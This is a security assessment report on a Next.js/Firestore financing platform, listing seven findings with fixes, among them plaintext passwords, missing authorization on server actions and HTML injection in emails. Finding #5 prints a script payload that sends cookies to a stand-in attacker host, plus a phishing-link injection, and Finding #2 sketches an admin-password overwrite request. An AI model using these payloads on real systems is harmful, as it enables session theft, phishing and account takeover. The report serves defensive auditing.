# Security Assessment Report

**Project:** Supermoney Anchor Platform  
**Date:** 2026-05-08  
**Branch:** enterprise  
**Assessment Type:** Static Code Analysis  

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 3 |
| Medium   | 2 |
| Low      | 1 |

---

## Finding #1 — Plaintext Password Storage

* **Severity:** Critical
* **Category:** `credential_storage`
* **Confidence:** 10/10
* **Files:** `src/app/add-anchor/actions.ts:34`, `src/app/auth/actions.ts:35`, `src/app/add-users/actions.ts:38`

**Description:**
User passwords are stored as plaintext in Firestore. The `addUser` action writes the password field directly without hashing. The `authenticate` function compares the submitted password against the stored value using strict equality (`===`). There is no password hashing (bcrypt/argon2/scrypt) anywhere in the codebase.

**Exploit Scenario:**
1. Any entity with read access to the Firestore `users` collection (Admin users, compromised Firebase console credentials, or via a misconfigured Firestore rule) can read all user passwords in plaintext.
2. Users who reuse passwords across services are exposed to credential-stuffing attacks if the database is ever breached.
3. An insider with Firestore access can impersonate any user.

**Recommendation:**
Hash all passwords using bcrypt or argon2 before storage. Update `authenticate` to use hash comparison. Existing plaintext passwords require a migration.

---

## Finding #2 — Missing Authorization on User Creation/Overwrite

* **Severity:** High
* **Category:** `authorization_bypass`
* **Confidence:** 10/10
* **Files:** `src/app/add-users/actions.ts:13-57`

**Description:**
The `addUsersFromJson` server action performs no authentication or authorization checks. It accepts a JSON string, parses it, and writes documents directly to the `users` collection in Firestore using `batch.set()` — which **overwrites** any existing user document at the given ID. Any authenticated user (including Anchor users with minimal privileges) can call this action and overwrite any user record, including Admin accounts, by specifying their document ID.

**Exploit Scenario:**
An authenticated Anchor user crafts a POST request to the server action endpoint with a JSON payload containing `{"id": "<admin-doc-id>", "password": "attacker123", "roleType": "Admin", ...}`. The admin's password is overwritten, granting the attacker full platform control.

**Recommendation:**
Add session and role validation at the top of the function:
```typescript
const session = await getSession();
if (!session || session.roleType !== 'Admin') {
    throw new Error('Unauthorized');
}
```

---

## Finding #3 — Missing Authorization on Bulk Data Operations

* **Severity:** High
* **Category:** `authorization_bypass`
* **Confidence:** 9/10
* **Files:**
  - `src/app/add-dealer/actions.ts` — `addDealers`
  - `src/app/add-invoice/actions.ts` — `addInvoices`
  - `src/app/add-program/actions.ts` — `addPrograms`
  - `src/app/update-gst/actions.ts` — `updateDealerGst`
  - `src/app/update-region/actions.ts` — `updateDealerRegion`
  - `src/app/update-email/actions.ts` — `updateDealerEmail`
  - `src/app/psbx/actions.ts:7` — `togglePsbxStatus`

**Description:**
These server actions perform write operations on Firestore collections (`dealers`, `invoices`, `programs`, `dealerLimits`) without any session or role validation. The Next.js App Router restricts which pages are visible to which roles via the sidebar navigation, but the server action endpoints themselves are unprotected. Any authenticated user can call them directly.

**Exploit Scenario:**
A non-Admin user (e.g., an Anchor user with `sales_person` sub-role) inspects network traffic, identifies the server action endpoint, and crafts requests to:
- Upload an Excel file that creates fraudulent dealers or invoices
- Toggle PSBX configuration on programs
- Bulk-update dealer GST, region, or email data

**Recommendation:**
Add a shared authorization helper and call it at the top of each admin-only server action:
```typescript
import { getSession } from "@/lib/session";
// At top of each admin action:
const session = await getSession();
if (!session || session.roleType !== 'Admin') {
    return { error: 'Unauthorized' };
}
```

---

## Finding #4 — Missing Authorization on Dealer Detail Updates

* **Severity:** High
* **Category:** `authorization_bypass`
* **Confidence:** 8/10
* **Files:** `src/app/dealers/actions.ts:36-81`, `src/app/retailers/actions.ts:36-76`

**Description:**
The `updateDealerDetails` server action in both `dealers/actions.ts` and `retailers/actions.ts` allows updating dealer limits and status without validating that the caller is authorized for the specific dealer's anchor. An Anchor user for anchor A can modify dealers belonging to anchor B by sending a request with `dealerId` set to a dealer from another anchor. Additionally, there's no role check — any authenticated user can call this.

The Firestore security rules restrict writes to Admin users only, which provides a server-side safety net for direct Firestore SDK calls. However, the server action bypasses this because it runs with elevated (admin SDK / client SDK) privileges from the server context.

**Exploit Scenario:**
Anchor user from "Stark Industries" (ANC001) modifies dealer limits for a dealer belonging to "Wayne Enterprises" (ANC002), inflating credit limits or changing dealer status.

**Recommendation:**
Verify the dealer's `anchorId` matches the session user's `externalId` before allowing the update (for Anchor users). Allow only Admins to cross-anchor update.

---

## Finding #5 — HTML Injection in Outbound Emails

* **Severity:** Medium
* **Category:** `html_injection`
* **Confidence:** 8/10
* **Files:**
  - `src/app/add-invoice/email-actions.ts:63-79` — `generateEmailBody`
  - `src/app/dashboard/bulk-invoice-actions.ts:50-90` — `generateEmailBody`
  - `src/app/dashboard/email-actions.ts:28-40` — `generateEmailBody`
  - `src/app/consent/actions.ts:72-84` — consent notification email

**Description:**
User-supplied data from uploaded Excel files (`dealerName`, `invoiceNumber`, `fileName`, `branchName`, etc.) is interpolated directly into HTML email bodies without any sanitization or escaping. An attacker who can control values in an uploaded Excel file can inject arbitrary HTML into emails sent by the platform.

**Exploit Scenario:**
An authenticated user uploads an Excel file where the `Dealer Name` column contains:
```
Test Dealer<script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```
Or, more practically for email:
```
Test Dealer</table><a href="https://phishing.example">Click here to update payment</a><table>
```
The injected content is rendered in the recipient's email client. While modern email clients strip `<script>` tags, HTML structure manipulation and phishing links remain effective.

**Recommendation:**
HTML-escape all user-supplied values before interpolating into email bodies. Use a library like `escape-html` or a templating engine with auto-escaping. Alternatively, send plain-text emails.

---

## Finding #6 — Single Shared API Key for All External Endpoints

* **Severity:** Medium
* **Category:** `credential_management`
* **Confidence:** 8/10
* **Files:**
  - `src/app/api/update-dealer-limit/route.ts:19`
  - `src/app/api/upsert-invoice/route.ts:29`
  - `src/app/api/upcoming-payments/route.ts:29`
  - `src/app/api/get-dealer-id/route.ts:16`

**Description:**
All four external API routes share a single secret (`DEALER_API_SECRET_KEY`) for Bearer token authentication. There is no key rotation mechanism, no per-endpoint or per-consumer key differentiation, and no key revocation capability. If this key is compromised, all external API surfaces are exposed simultaneously.

**Exploit Scenario:**
The key leaks through a log, a misconfigured environment, or a former employee. The attacker can then push fraudulent dealer limits, upsert invoices, inject upcoming payment records, and query dealer data across all four endpoints with no additional barriers.

**Recommendation:**
Issue separate API keys per consumer/endpoint. Store them in Google Cloud Secret Manager (already partially configured in `apphosting.yaml`). Implement key rotation and consider using a more robust authentication mechanism (e.g., service accounts with scoped permissions).

---

## Finding #7 — Hardcoded Static Values in External API Call

* **Severity:** Low
* **Category:** `data_integrity`
* **Confidence:** 7/10
* **Files:** `src/app/api/get-dealer-id/route.ts:88-98`

**Description:**
The `POST /api/get-dealer-id` handler makes a fire-and-forget call to `https://app.supermoney.in/api/invoices/upsert` with hardcoded static values (`invoiceNumber: "INV-GAS-001"`, `utrNo: "UTR999888"`, `amount: 25000`, `status: "Pending"`). These appear to be placeholder/test values that were never replaced with actual data. This call forwards data to a production external API with fabricated invoice information each time the endpoint is queried.

**Exploit Scenario:**
Each call to `/api/get-dealer-id` creates or updates an invoice with fake data in the external production system. An attacker repeatedly calling this endpoint could pollute the external system with garbage invoice records.

**Recommendation:**
Replace static placeholder values with actual invoice data from the request or remove this fire-and-forget call if it is not yet ready for production.

---

## Appendix: What Went Well

- **CSRF Protection:** Next.js Server Actions include built-in CSRF protection via encrypted tokens.
- **Zod Validation:** All API routes and server actions use Zod schemas for input validation, preventing type confusion and NoSQL injection.
- **Session Encryption:** iron-session uses AES-encrypted cookies. The session cookie password has reasonable entropy.
- **Firestore Rules:** The security rules (`firestore.rules`) implement role-based access control and default-deny posture. Anchor users can only read their own data.
- **Consent Token:** Uses `crypto.randomBytes(32)` (256 bits) for consent tokens — practically unguessable.
- **PSBX API:** The external PSBX limit fetch does not expose credentials and validates responses.

---

*Report generated by static code analysis. No production systems or data were accessed.*
